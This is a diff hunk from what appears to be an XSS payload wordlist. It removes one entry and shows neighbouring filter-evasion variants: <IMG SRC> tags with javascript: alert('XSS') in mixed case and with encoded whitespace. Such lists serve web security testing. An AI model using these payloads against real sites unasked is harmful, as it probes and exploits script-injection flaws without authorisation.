@@ -756,7 +756,7 @@ a.jsp/<script>alert('Vulnerable')</script>
 <IMG SRC="javascript.:alert('XSS');">
 <IMG src="/javascript.:alert"('XSS')>
 <IMG src="/JaVaScRiPt.:alert"('XSS')>
-<IMG src="/JaVaScRiPt.:alert"(&quot;XSS&quot;)>
+
 <IMG SRC="jav&#x09;ascript.:alert('XSS');">
 <IMG SRC="jav&#x0A;ascript.:alert('XSS');">
 <IMG SRC="jav&#x0D;ascript.:alert('XSS');">
